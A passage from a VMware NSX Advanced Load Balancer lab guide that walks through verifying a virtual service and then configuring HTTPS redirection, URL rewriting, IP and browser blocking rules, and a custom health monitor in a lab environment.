<p>To aide security administrators with rule management the ALB created some groups in NSX-T and populated them with the IPs of the different objects.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/929/medium/6b4d5e43-657f-45da-8586-34ec6d04cf86.png" alt="" /></p>
<ol>
<li>Please click <strong>Inventory</strong> in top menu bar.</li>
<li>Select <strong>Groups</strong></li>
<li>The groups created by the ALB are prefixed as defines with ALB-<br />
Note: it might take some time to see the <strong>ALB-webapp*</strong> groups.</li>
<li>Please feel free to view the group members.</li>
</ol>
<p>Please see the following link for more information regarding Security Automation:<br />
https://avinetworks.com/docs/20.1/nsx-t-design-guide/#security-automation</p>
<h4 id="252-services"><a class="header" href="#252-services">2.5.2. Services</a></h4>
<p>Now lets see the Service definitions.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/931/medium/37d8e95b-8a7b-4e23-ba97-a58c41718bb0.png" alt="" /></p>
<ol>
<li>Still on the Inventory tab, select <strong>Services</strong></li>
<li>Use a filter for <strong>ALB</strong> to view the services configured by the Controller.</li>
<li>You will get a list of services used by the NSX Advanced LB</li>
<li>Optional: check the Tags assigned to the services.</li>
</ol>
<h4 id="253-se-management-segments"><a class="header" href="#253-se-management-segments">2.5.3. SE Management Segments</a></h4>
<p>Let take a look on the SE Management segment we crated at the beginning.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/942/medium/90e6fe14-da5c-4461-b74d-46cdbc850bb9.png" alt="" /></p>
<ul>
<li>Click <strong>Networking</strong></li>
<li>Switch to the <strong>Segments</strong> view</li>
<li>Locate the <strong>OV-LBMGMT</strong> segment</li>
<li>Click the number in the <strong>Ports</strong> column.</li>
</ul>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/944/medium/dbd34425-d33a-446b-ab56-135e431f3532.png" alt="" /></p>
<p>You can see the two SEs that have been deployed in the list.</p>
<h4 id="254-static-routes"><a class="header" href="#254-static-routes">2.5.4. Static Routes</a></h4>
<p>During the lecture we learned that the ALB uses static routes to advertise the virtual service IPs.</p>
<p>So then lets see what we can find on the T1 that we used in our setup.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/971/medium/4f0f64aa-0e60-47ae-9a2c-908ab9a06094.png" alt="" /></p>
<ol>
<li>Still on the Networking tab, select <strong>Tier-1 Gateways</strong></li>
<li>Locate the <strong>T1-GATEWAY</strong> and open the details view by clicking on the triangle.</li>
<li>Next expand the <strong>STATIC ROUTES</strong></li>
<li>Click the <strong>1</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/973/original/a5b80497-755c-41ed-9644-38250cd3b2d1.png" alt="" /></p>
<ol>
<li>In the <strong>Network</strong> column you will see the VIP of the WebApp virtual service.</li>
<li>Click the <strong>1</strong> in the <strong>Next Hops</strong> column</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/975/original/69b81a6a-01e3-411b-b30b-c8b59ff0793c.png" alt="" /></p>
<ol>
<li>The IP address is the IP of the SE running the virtual service.</li>
<li>Click <strong>CLOSE</strong></li>
</ol>
<p>Please also close all other dialogue windows. Meanwhile the virtual service should be up and running... lets see!</p>
<h2 id="3-virtual-service-deployment-check"><a class="header" href="#3-virtual-service-deployment-check">3. Virtual Service Deployment Check</a></h2>
<p>Please re-open the tab pointing to the management UI of the ALB.</p>
<p>This is the screen we left in step 2.3:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/284/977/medium/b4089749-352b-49b8-80ce-78b7050dd95f.png" alt="" /></p>
<p>Place the mouse over the icon in the top right corner to get an overview of the status of the virtual service.</p>
<blockquote>
<p>You get to the screen shown above by navigating:</p>
<p>Applications &gt; Virtual Services &gt; click webapp.corp.local</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/589/medium/c253b1f0-d8cb-4800-bbb7-c3dc73d8bbe7.png" alt="" /></p>
<p>Lets get more information about the status of the virtual service: Please place your mouse over the virtual service name.</p>
<p>You will see the service uptime, configured ports and IPs.</p>
<p>You can also identify the Service Engine that the VS is hosted on -&gt; note the name we will take a look at it in vSphere in a moment.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/285/060/medium/07d6b9a2-a031-404d-9b8a-bf483fa6978e.png" alt="" /></p>
<ol>
<li>Click <strong>Events</strong></li>
<li>In the table you can see a list of all the event related to this VS. You can view details to every entry by clicking the <strong>+</strong> sign on the right.</li>
</ol>
<h3 id="31-optional-check-se-in-vsphere"><a class="header" href="#31-optional-check-se-in-vsphere">3.1. Optional: Check SE in vSphere</a></h3>
<p>We identified the SE that the VS is hosted on in a previous step</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/591/medium/df35c1b7-e4ce-4dc2-9521-b5872737219e.png" alt="" /></p>
<p>When you check out the configuration of the VM, you will notice that it is connected to the OV-LBMGMT and the OV-WEB segments.</p>
<h3 id="32-server-pool"><a class="header" href="#32-server-pool">3.2. Server Pool</a></h3>
<p>Next we will take a look on the server pool.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/285/089/medium/451ebc53-44df-4e6a-ac20-c5a01311ab52.png" alt="" /></p>
<ol>
<li>You should be still on the Applications screen. Now switch to <strong>Pools.</strong></li>
<li>Click <strong>webapp.corp.local-pool</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/285/091/medium/9dd9c357-f106-41c2-8baf-31eb1526d793.png" alt="" /></p>
<ol>
<li>Click <strong>Servers</strong> to get to the list of the pool members.</li>
<li>Next click one of the IPs in the <strong>Server Name</strong> column.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/285/093/medium/c9b69238-4398-4708-bb08-225a0c93c5d9.png" alt="" /></p>
<p>On this page you can see the results provided by the Health Monitors.</p>
<ol>
<li>In our case we have an Passive monitor, that cannot be configured. 
And an active one: <strong>System-HTTPS</strong></li>
<li>Details of the heath monitor results can be viewed by clicking the <strong>+</strong> icon on the right.</li>
<li>Please go back to the Pools overview by clicking the arrow sign in the top left corner.</li>
</ol>
<blockquote>
<p>If you pool members are marked down after VS creation. Check out the results of the active health monitor.</p>
<p>Sometimes its just the wrong response that marks your servers down!</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/139/601/medium/50663b79-b0f5-4ddb-92a0-912865a34254.png" alt="" /></p>
<p>Back on the Pools page, click <strong>Events</strong>. Please feel free to view the details of the events of the server pool.</p>
<p>Meanwhile you should have noticed that the +/- are always used to expand/fold fields in the UI.   :-)</p>
<h3 id="33-service-engines"><a class="header" href="#33-service-engines">3.3. Service Engines</a></h3>
<p>In a final step we just want to take a look on the SEs:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/285/138/medium/591a5506-c1b9-4031-95bd-24420cbe97be.png" alt="" /></p>
<ol>
<li>Please switch to the <strong>Infrastructure</strong> context using the system menu in the top left corner.</li>
<li>Click <strong>Service Engine</strong></li>
<li>Select the NSX-T cloud: <strong>nsxmgr-01a</strong></li>
</ol>
<p>In my case the VS was placed on the first SE and I can view all active VS on a SE by expanding the line using the + signal on the right.</p>
<h2 id="4-access-webapp"><a class="header" href="#4-access-webapp">4. Access WebApp</a></h2>
<p>Finally, we want to check our virtual service.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/115/744/medium/c24668d0-7d43-44d5-9819-0c464a5987e3.png" alt="" /></p>
<p>Please open a new tab in Chrome and click the bookmark 3-Tiers-WebApp. Your screen should look similar to the screenshot above.</p>
<p>Repetitive clicks will switch between the two IPs: .11 and .12. If this is not the case in your environment, please check the LB algorithm set at the server pool.</p>
<blockquote>
<p>Congratulations! You have successfully deployed a virtual service in NSX Advanced Load Balancer.</p>
</blockquote>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="35-optional-service-optimization-and-operations"><a class="header" href="#35-optional-service-optimization-and-operations">3.5 Optional: Service Optimization and Operations</a></h1>
<blockquote>
<p>Welcome to the optional Optimization and Operations Lab.</p>
<p>The intention of this lab is to give you more time to discover the features and options of the NSX Advanced Load Balancer. It is completely up to you to work through this lab guide - it does not affect any upcoming tasks. This guide is split into two main topics:</p>
<ol>
<li><strong>Service Customization:</strong> which includes tasks like
<ul>
<li>HTTPS Redirection</li>
<li>VS Policies to manipulate requests</li>
<li>Blocking IP addresses or specific browsers</li>
</ul>
</li>
<li><strong>Operations:</strong> to discuss
<ul>
<li>VS Scaling and Migration</li>
<li>Active Directory integration for authentication</li>
<li>CLI</li>
</ul>
</li>
</ol>
<p>It will take a while to work through the whole guide! So if you are short on time, use this guide as a reference, the concepts and tasks highlighted here can be performed on any environment. We hope that the steps described below will help you with upcoming PoCs or installations. 
Enjoy!  :-)</p>
</blockquote>
<blockquote>
<p>We assume you are now familiar with the ALB interface. So to keep this (already long) lab guide short, we excluded some obvious steps in the manual. But we are convinced that you will find your way through...   :-)</p>
</blockquote>
<h2 id="1-service-customization"><a class="header" href="#1-service-customization">1. Service Customization</a></h2>
<blockquote>
<p>After we successfully replaced the existing LB solution, our customer asked for improvements around service access and security.</p>
<p>In this chapter we will work through these customer requests.</p>
</blockquote>
<h3 id="11-http-to-https-redirect"><a class="header" href="#11-http-to-https-redirect">1.1. HTTP to HTTPS Redirect</a></h3>
<p><strong>Customer Request:</strong> On some devices and with some older browsers users cannot access the WebApp because they just enter the address <code>webapp.corp.local</code>. We can replicate this behavior by entering <a href="http://webapp.corp.local/cgi-bin/app.py">http://webapp.corp.local/cgi-bin/app.py</a> into a incognito window in Chrome:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/431/original/8e82fd4f-246f-45e0-889e-2fa1c2bc2768.png" alt="" /></p>
<p>As you can see in the screenshot above, we cannot access the WebApp because the App listens to HTTPS only.</p>
<p><strong>Task</strong>: Make sure that all requests to this VS are redirected to HTTPS.</p>
<h4 id="111-verify-application-profile"><a class="header" href="#111-verify-application-profile">1.1.1. Verify Application Profile</a></h4>
<p>Part of the virtual service configuration was to select an Application Profile. For the WebApp we used: <strong>System-Secure-HTTP</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/433/medium/9766bd9d-46fc-4b4b-88ae-3942536a514a.png" alt="" /></p>
<ol>
<li>Click on the system menu in the top left corner and select <strong>Templates</strong></li>
<li>Click <strong>Profiles</strong></li>
<li>Make sure you are on the <strong>Application</strong> tab</li>
<li>Locate the profile <strong>System-Secure-HTTP</strong> from the list and click the pencil icon on the right</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/435/medium/c0bd591b-76e1-41f6-96c5-835143de3c3c.png" alt="" /></p>
<ol>
<li>In the top menu click <strong>Security</strong></li>
<li>We can see that this profile has <strong>HTTP-to-HTTP Redirect</strong> enabled by default</li>
<li>Click <strong>Cancel</strong></li>
</ol>
<blockquote>
<p>To learn more about Application Profiles see:<br />
<a href="https://avinetworks.com/docs/20.1/architectural-overview/templates/profiles/application-profile/">https://avinetworks.com/docs/20.1/architectural-overview/templates/profiles/application-profile/</a></p>
</blockquote>
<h4 id="112-reconfigure-virtual-service"><a class="header" href="#112-reconfigure-virtual-service">1.1.2. Reconfigure Virtual Service</a></h4>
<p>Our Application Profile is configured for HTTP-to-HTTPS redirect. So the only thing that we have to do is to add port 80 to the VS.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/437/medium/75fa4a74-4d66-4227-a0b9-cd37cc519c45.png" alt="" /></p>
<ol>
<li>Open the <strong>Applications</strong> context in the system menu.</li>
<li>Select <strong>Virtual Services</strong></li>
<li>As we can see the webapp.corp.local VS only listens to port 443</li>
<li>Click the <strong>edit icon</strong> on the right.</li>
</ol>
<p>Note: Your Health score might be different.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/439/medium/d8b06984-c94d-49df-8dde-6f372ce08592.png" alt="" /></p>
<p>Please scroll down until you get to the Service Port section.</p>
<ol>
<li>First you have to click <strong>Add Port</strong></li>
<li>Enter port: <strong>80</strong></li>
<li>Click <strong>Save</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/441/original/f2512412-f419-4c6b-9e03-4b253276900a.png" alt="" /></p>
<p>Port 80 was added successfully to the virtual service.</p>
<h4 id="113-check-webapp-access-and-client-logs"><a class="header" href="#113-check-webapp-access-and-client-logs">1.1.3. Check WebApp Access and Client Logs</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/119/026/original/52ee4a0a-8f68-4ee5-9bec-7b808c8ff6af.png" alt="" /></p>
<p>Clicking <strong>Refresh</strong> in the incognito window of Chrome will now redirect us to the HTTPS port!</p>
<p>Lets check out how this redirection was logged:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/119/028/original/e013db84-fd4c-45f9-941f-46f31c017391.png" alt="" /></p>
<p>In the virtual service list click <strong>webapp.corp.local</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/443/medium/f037432e-9371-4f13-9800-620ca789a377.png" alt="" /></p>
<p>In the virtual service screen</p>
<ol>
<li>Click <strong>Logs</strong></li>
<li>Turn on <strong>Non-Significant Logs</strong></li>
<li>Look for a response code <strong>3xx</strong></li>
<li>and click the <strong>+ sign</strong> on the right to see all details of this request:</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/445/medium/c25af379-b2ed-4ace-8fd8-d2c22003e4e2.png" alt="" /></p>
<p>For now we want to focus on:</p>
<ol>
<li>A request from the controlcenter IP to the virtual service port <strong>80</strong></li>
<li>and the redirect to <strong>https</strong></li>
</ol>
<h3 id="114-information-only-redirection-via-policy"><a class="header" href="#114-information-only-redirection-via-policy">1.1.4. Information Only: Redirection via Policy</a></h3>
<blockquote>
<p>In our case the Application Profile contained a HTTP to HTTPS redirect instruction. If you are using a different Application Profile that does not support this feature and want to achieve the same result you can configure a HTTP Security or a HTTP Request rule like the one shown below.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/447/medium/4118df1b-a968-4d60-bcf4-ff00a5176d9a.png" alt="" /></p>
<p>Open the virtual service configuration screen as before.</p>
<ol>
<li>Switch to <strong>Policies</strong></li>
<li>Click <strong>HTTP Security</strong></li>
<li>Click the green plus sign to add a new rule</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/449/medium/60caa9cf-3893-43c8-bd1e-5e5fbb9c7fd2.png" alt="" /></p>
<ol>
<li>Provide a <strong>Name</strong></li>
<li>Create a <strong>Matching Rule</strong> for Service Port is 80</li>
<li>Set the <strong>Action</strong> to Redirect to HTTP and enter the target port.</li>
<li>Click <strong>Cancel</strong> for now</li>
</ol>
<blockquote>
<p>You can also configure a similar rule in the <strong>HTTP Request</strong> section with even more redirect options as well. Explore!</p>
</blockquote>
<h3 id="12-request-rewrite"><a class="header" href="#12-request-rewrite">1.2. Request Rewrite</a></h3>
<p><strong>Customer Request:</strong> To access the WebApp users need to enter a quite long URI: <code>webapp.corp.local/cgi-bin/app.py</code> This caused some troubles in the past.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/802/original/1fb8911e-f573-4696-a6bc-f2261174333c.png" alt="" /></p>
<p>As you can see in the screenshot above the URI is quite long.</p>
<p><strong>Task</strong>: Provide a solution to allow users to get to the WebApp by  just entering: <code>webapp.corp.local</code></p>
<h4 id="121-reconfigure-virtual-service"><a class="header" href="#121-reconfigure-virtual-service">1.2.1. Reconfigure Virtual Service</a></h4>
<blockquote>
<p>We will use a Request Rewrite Policy to solve the customer's request.</p>
</blockquote>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/804/medium/2d139750-9604-4f28-9efb-79afc950d2f2.png" alt="" /></p>
<ol>
<li>Make sure you are in the <strong>Applications</strong> context.</li>
<li>Click <strong>Virtual Services</strong></li>
<li>Click the <strong>edit icon</strong> in the row of the webapp.corp.local service</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/806/medium/96402973-12d3-4a44-a8ef-360dde46e402.png" alt="" /></p>
<ol>
<li>Switch to the <strong>Policies</strong> screen</li>
<li>Select <strong>HTTP Request</strong></li>
<li>Click the green <strong>plus sign</strong> to add a new rule.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/808/medium/c2c854e5-6f74-42b6-8998-cb2007c33cfb.png" alt="" /></p>
<ol>
<li>Enter a rule name: <strong>AddFullPath</strong></li>
<li>Please turn on logging</li>
<li>In the Matching Rules section open the drop-down list and look for: <strong>Path</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/810/medium/30166d56-e2ce-49bf-a820-7e15c7231f02.png" alt="" /></p>
<ol>
<li>From the criteria menu select: <strong>Does not contain</strong></li>
<li>In the String group or custom string menu look for <strong>Custom Value</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/812/medium/748c22f6-801f-4d6f-8031-d07fc725b2a6.png" alt="" /></p>
<ol>
<li>Enter the custom value: <strong>cgi-bin/app.py</strong></li>
<li>Within the Action section select: <strong>Rewrite URL</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/814/medium/65756e6f-22c3-4fd5-b45c-5ece69a8d88d.png" alt="" /></p>
<ol>
<li>Enter in the Existing Path field: <strong>cgi-bin/app.py</strong></li>
<li>Click <strong>Save Rule</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/816/medium/9527d58e-3165-4c4d-a368-d4c1951706fa.png" alt="" /></p>
<p>Please verify the rule you entered. Click <strong>Save</strong></p>
<h4 id="122-check-webapp"><a class="header" href="#122-check-webapp">1.2.2. Check WebApp</a></h4>
<p>Lets see if your rule works...</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/818/original/87d50468-4cce-4b1c-8b03-62e40931f8d0.png" alt="" /></p>
<p>Open a new tab in your browser and enter the (incomplete) URL: <code>webapp.corp.local</code> If you have configured everything correctly, you should get redirected...</p>
<p>We activated logging for our rule - lets see what we can see in the logs:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/119/297/original/2ea48429-87d6-4b7b-a215-70c1498035f1.png" alt="" /></p>
<p>Please navigate back to the Virtual Service overview and click the VS name: <strong>webapp.corp.local</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/821/medium/454be692-4ca6-4537-9f5d-5a16db05393d.png" alt="" /></p>
<ol>
<li>Switch to the <strong>Logs</strong> view</li>
<li>Enable the <strong>Non-Significant Logs</strong></li>
<li>Look for an entry pointing to &quot;/&quot; and expand the view by clicking on the + sign on the right side of the row. 
(Note: if you do not see any entries, press the reload button next to the Search bar.)</li>
<li>So lets see what we have: We can see the Client IP (controlcenter) connecting to the VS IP on port 443</li>
<li>Server IP points to the server that processed the request: 172.16.10.12</li>
<li>We can see the Rule that has been applied to this request.</li>
<li>The requested URI is logged: /<br />
as well as the Rewritten URI: /cgi-bin/app.py</li>
</ol>
<h3 id="13-blocking-bad-actors"><a class="header" href="#13-blocking-bad-actors">1.3. Blocking Bad Actors</a></h3>
<p><strong>Customer Request:</strong> The customer want to block WebApp access for specific IPs or Ranges. 
He asks to demonstrate this using the <strong>ubuntu-utils</strong> VM with the IP <strong>192.168.110.11</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/119/661/original/c6c1b544-dc50-4a57-8c3b-da01274ba6b5.png" alt="" /></p>
<p>Open putty and connect to ubuntu-utils. Run the command: <code>curl -I webapp.corp.local</code> You should see a similar response as shown in the screenshot above.</p>
<p><strong>Task</strong>: Block the IP 192.168.110.11 using NSX ALB.</p>
<h4 id="131-reconfigure-virtual-service"><a class="header" href="#131-reconfigure-virtual-service">1.3.1. Reconfigure Virtual Service</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/941/medium/4d37a8a4-9077-4b5b-bc46-ed26f5e5e6b2.png" alt="" /></p>
<p>You already know how to edit a VS from the Virtual Service overview screen.</p>
<p>An alternative way is to click the pencil icon in the VS view.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/287/943/medium/f1146aff-8a96-44f8-9504-f85003bcaa15.png" alt="" /></p>
<p>You already have seen how to configure Policies, so to keep this guide short, we do not show all steps in detail.</p>
<ol>
<li>Switch to the <strong>Policies</strong> configuration screen</li>
<li>This time we will create a <strong>Network Security</strong> rule. Not shown: click the <strong>green plus sign</strong> to add a new rule</li>
<li>Enter a Name: <strong>Block Bad IPs</strong></li>
<li>In the Matching Rules section select <strong>Client IP Address</strong> from the drop-down menu.</li>
<li>Click the drop-down for the <strong>IP Address</strong> field and select <strong>Create</strong></li>
</ol>
<p>This will open the IP Group configuration screen:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/161/medium/55b8010f-f71c-4f4e-a03f-8426ecd18123.png" alt="" /></p>
<ol>
<li>Provide a IP Group Name: <strong>Denylist IPs</strong></li>
<li>Enable <strong>Select by IP Address</strong></li>
<li>Enter the IP: <strong>192.168.110.11</strong></li>
<li>Click <strong>Add</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/163/medium/9aaf5e67-a281-4b08-90ee-ab7b56b2ba63.png" alt="" /></p>
<p>The IP is added to the list. Click <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/165/medium/13698dbb-4906-46be-bd04-a543775e678a.png" alt="" /></p>
<ol>
<li>The IP List is added to the Matching Rule section</li>
<li>In the Action section select <strong>Deny</strong></li>
<li>Activate <strong>Logging</strong> for this Rule</li>
<li>Click <strong>Save Rule</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/167/medium/0def960c-a760-4689-b1be-306dbd320db2.png" alt="" /></p>
<p>Verify the rule configuration and click <strong>Save</strong>.</p>
<h4 id="132-verify-setup"><a class="header" href="#132-verify-setup">1.3.2. Verify Setup</a></h4>
<p>Re-open the putty session pointing to ubuntu-utils.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/119/676/original/cf91a304-e3fb-4002-a291-ae17979463b4.png" alt="" /></p>
<p>Rerun the command that we entered before: <code>curl -I webapp.corp.local</code></p>
<p>You should not get an answer. Press CTRL-C to stop the request.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/169/medium/a55e7455-41cd-449b-9f91-1ecc1ff8acd0.png" alt="" /></p>
<p>Let check what we can see in the logs:</p>
<ol>
<li>Open <strong>Logs</strong> tab of the virtual service</li>
<li>Enable <strong>Non-Significant Logs</strong></li>
<li>Press <strong>Refresh</strong> to make sure you get the latest log messages from the SEs.</li>
<li>Look for a request from the IP <strong>192.168.110.11</strong> and expand the entry by clicking the <strong>+</strong> sign on the right.</li>
<li>It is logged that the IP belongs to the IP List/Location <strong>Denylist IPs</strong></li>
<li>And the request hit the Network Security Rule: <strong>Block Bad IPs</strong></li>
</ol>
<h3 id="14-custom-health-check"><a class="header" href="#14-custom-health-check">1.4. Custom Health Check</a></h3>
<p><strong>Customer Request:</strong> In the past user has been forwarded to back-end servers that lost the connectivity to the back-end. The previous LB solution just check for open ports but not for the accessibility of the WebApp.</p>
<p><strong>Task:</strong> Create a more robust server health monitor that also check the server response.</p>
<h4 id="141-reconfigure-server-pool"><a class="header" href="#141-reconfigure-server-pool">1.4.1. Reconfigure Server Pool</a></h4>
<p>For the VS deployment we used the system provided System-HTTPS health monitor. Now we want to configure a health monitor optimized for the WebApp.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/424/medium/a42de24b-4e6e-479e-918c-eb36b4c227d6.png" alt="" /></p>
<p>To change the health monitor, we have to re-configure the server pool:</p>
<ol>
<li>We can find the pool in the <strong>Application</strong> section.</li>
<li>Click <strong>Pools</strong></li>
<li>Click the edit icon for the <strong>webapp.corp.local-pool</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/426/medium/bec96afd-dd91-4bf5-ac4c-98fd699e7296.png" alt="" /></p>
<ol>
<li>Click the drop-down menu</li>
<li>Select <strong>Create Health Monitor</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/428/medium/c9ad0e49-df47-41c3-89bc-b4242e79141d.png" alt="" /></p>
<ol>
<li>Enter a name: <strong>WebApp</strong></li>
<li>Set Type to: <strong>HTTPS</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/282/medium/131b0ef4-5414-4339-82a5-98e95b44886e.png" alt="" /></p>
<p>Scroll down to the <strong>Client Request Header</strong> and enter:<br />
<code>GET /cgi-bin/app.py HTTP/1.0</code></p>
<p>Make sure you enter the string exactly as shown!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/284/medium/377d2495-69c0-42ab-81a2-5911623c1619.png" alt="" /></p>
<p>Scroll further down the page.</p>
<ol>
<li>In the Server Response Data field enter:<br />
<code>Customer Database</code></li>
<li>From the drop-down add <strong>2XX</strong> and <strong>3XX</strong> to the Response Code.</li>
<li>Click <strong>Save</strong></li>
</ol>
<p>Make sure you enter the string exactly as shown!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/432/medium/bba4e852-7abc-4789-aabb-b9501179a172.png" alt="" /></p>
<p>Back on the pool configuration page.</p>
<ol>
<li>Make sure the new <strong>WebApp</strong> health monitor is activated</li>
<li>Click <strong>Save</strong></li>
</ol>
<h4 id="142-verify-setup"><a class="header" href="#142-verify-setup">1.4.2. Verify Setup</a></h4>
<p>Lets see if our pool is still &quot;up&quot;...</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/434/medium/1c36c4d0-38e2-46f1-a90e-7b3af5e29584.png" alt="" /></p>
<ol>
<li>Make sure you are on <strong>Pools</strong> page.</li>
<li>Click the <strong>webapp.corp.local-pool</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/436/medium/f490db23-10a8-4417-b97e-53b1198830b4.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>Servers</strong> view.</li>
<li>Click on of the <strong>Server Names</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/541/medium/e7d37224-a9c6-41d3-ac23-e6531f3f9ee9.png" alt="" /></p>
<ol>
<li>Expand the view of the active health monitor.</li>
<li>You can see we now have app specific Request String and  evaluate the server Response.</li>
</ol>
<h3 id="15-block-unmanaged-browsers"><a class="header" href="#15-block-unmanaged-browsers">1.5. Block Unmanaged Browsers</a></h3>
<p><strong>Customer Request:</strong> The customers security policy define Google Chrome and MS Edge as secure as they are managed and updated by group policies.</p>
<p><strong>Task</strong>: Block unmanaged browsers like Firefox.</p>
<h4 id="151-reconfigure-virtual-service"><a class="header" href="#151-reconfigure-virtual-service">1.5.1. Reconfigure Virtual Service</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/543/medium/fd9b0b39-58b1-4713-8e55-8e9f1ae068ea.png" alt="" /></p>
<ol>
<li>Make sure you are in the <strong>Applications</strong> context.</li>
<li>Click <strong>Virtual Services</strong></li>
<li>Click the <strong>edit icon</strong> in the row of the webapp.corp.local service</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/545/medium/611c3086-97c1-41c3-a244-afbc6f3702d7.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>Policies</strong> page.</li>
<li>Select <strong>HTTP Request</strong></li>
<li>Click the <strong>green plus</strong> sign to add a new rule</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/350/908/medium/caf0a72f-42dd-4f38-998d-d0fac396976c.png" alt="" /></p>
<p>Please configure the rule as follows:</p>
<ol>
<li>Name: <strong>Block Unmanaged Browser</strong></li>
<li>Enable Logging</li>
<li>In the Matching Rule section choose <strong>Header</strong> from the drop-down menu</li>
<li>Set criteria to: <strong>Contains</strong></li>
<li>Name: <strong>User-Agent</strong></li>
<li>Value: <strong>Firefox</strong></li>
<li>In the Action section, choose <strong>Content Switch</strong> from the drop-down menu</li>
<li>Enable <strong>Local Response</strong> and set the Status Code to <strong>403</strong></li>
<li>Click <strong>Save Rule</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/549/medium/1496843a-5f6a-401a-84b6-6c4b12a4c1c5.png" alt="" /></p>
<ol>
<li>Optional: Drag-drop the &quot;Block Unmanaged Browser&quot; rule to be processed first. So the browsers are blocked immediately.</li>
<li>Click <strong>Save</strong></li>
</ol>
<h4 id="152-verify-setup"><a class="header" href="#152-verify-setup">1.5.2. Verify Setup</a></h4>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/551/medium/279988d1-6a50-4d27-85f1-d0731b9777bc.png" alt="" /></p>
<p>Open Firefox from the Windows taskbar and enter <code>webapp.corp.local</code> Firefox was successfully blocked.</p>
<p>Lets see what we can see in the Logs:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/288/779/medium/4d08e180-14e1-494c-a917-51012a39ef5e.png" alt="" /></p>
<p>We are pretty sure that you know by now how to get to the Logs of the Virtual Service...   :-)</p>
<ol>
<li>Please press <strong>Refresh</strong> to make sure you get the latest logs from the SEs.</li>
<li>Note: You do not need to enable Non-Significant Logs, because Response Codes of 4xx are considered as significant.</li>
<li>Look for an entry with the response code <strong>403</strong></li>
<li>Like before we can identify the Rule that processed this request.</li>
<li>Here we see the entry that we were looking for in our rule.</li>
</ol>
<h2 id="2-operations"><a class="header" href="#2-operations">2. Operations</a></h2>
<blockquote>
<p>We successfully optimized the Virtual Service.</p>
<p>Now it is time to take a look on some operational tasks.</p>
</blockquote>
<h3 id="21-service-scaling-and-migration"><a class="header" href="#21-service-scaling-and-migration">2.1. Service Scaling and Migration</a></h3>
<p><strong>Customer Request:</strong> Increase throughput and decrease fail-over time by scaling out the VS to a second SE.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/291/093/medium/35669d1e-e0a1-4223-8a66-16cce05d6e30.png" alt="" /></p>
<p>Please open the <strong>webapp.corp.local</strong> virtual service.</p>
